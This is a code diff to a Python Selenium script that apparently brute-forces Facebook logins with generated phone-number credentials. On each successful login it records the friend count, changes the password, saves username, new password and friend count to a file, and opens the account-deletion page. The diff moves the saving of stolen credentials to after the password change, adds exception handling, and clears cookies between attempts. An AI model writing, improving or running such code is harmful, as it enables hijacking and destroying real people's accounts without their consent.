@@ -78,9 +78,12 @@ def run(firstNum, secondNum, totalTabs, totalAccount, prefix, newPass, customPas
         loginBtn = driver.find_element(By.NAME, 'login')
         loginBtn.click()
         sleep(2)
+        driver.get("https://www.facebook.com/")
+        sleep(1)
         try:
-            WebDriverWait(driver, DELAY/2).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/div[1]/div[1]/div/div[3]/div/div/div/div[1]/div[1]/div/div[2]/div/div/div/div[3]/div/div[2]/div/div/div")))
-        except Exception:
+            WebDriverWait(driver, DELAY/2).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/div/div[1]/div/div[3]/div/div/div/div[1]/div[1]/div/div[1]/div/div/div[1]/div/div/div[1]/ul/li/div/a/div[1]/div[2]/div/div/div")))
+        except Exception as e:
+            print(e)
             return
         driver.get("https://www.facebook.com/profile.php?")
         sleep(1)
@@ -94,10 +97,7 @@ def run(firstNum, secondNum, totalTabs, totalAccount, prefix, newPass, customPas
             username = urlData['id']
 
         totalFriend = WebDriverWait(driver, DELAY).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[1]/div/div[3]/div/div/div/div[1]/div[1]/div/div/div[1]/div[2]/div/div/div/div[3]/div/div/div[2]/span/a'))).text
-        
-            
-        with open(f"/output/{currentTime}/accounts.txt", "a+") as f:
-            f.write(f"{username} - {password} - {totalFriend}\n")
+    
             
         driver.get("https://mobile.facebook.com/settings/security/password/")
 
@@ -114,7 +114,10 @@ def run(firstNum, secondNum, totalTabs, totalAccount, prefix, newPass, customPas
         WebDriverWait(driver, DELAY).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[4]/div/form/div[1]/div/section[2]/fieldset/label[2]/div/div[1]/div'))).click()
         WebDriverWait(driver, DELAY).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[4]/div/form/div[2]/button'))).click()
 
-
+    
+            
+        with open(f"./output/{currentTime}/accounts.txt", "a+") as f:
+            f.write(f"{username} - {newPass} - {totalFriend}\n")
         driver.get("https://mobile.facebook.com/account/delete/")
         WebDriverWait(driver, DELAY).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[4]/div/div[1]/form/div[1]/div[3]/div[2]/label/div/div[1]/input'))).click()
         WebDriverWait(driver, DELAY).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[4]/div/div[1]/form/div[2]/button'))).click()
@@ -138,7 +141,17 @@ def run(firstNum, secondNum, totalTabs, totalAccount, prefix, newPass, customPas
             for number in numbers:
                 changeAtmps(1)
                 driver.get("https://www.facebook.com/")
-                tryWithCred(driver, number)
+                try:
+                    tryWithCred(driver, number)
+                except Exception as e:
+                    print("\n\n\n\n")
+                    print("\n\n\n\n")
+                    print({"e": e})
+                    print("\n\n\n\n")
+                    print("\n\n\n\n")
+                    pass
+                driver.delete_all_cookies()
+
                 print(number)
             
         t = thread_with_exception(target=tryAccount, args=(numbers,))
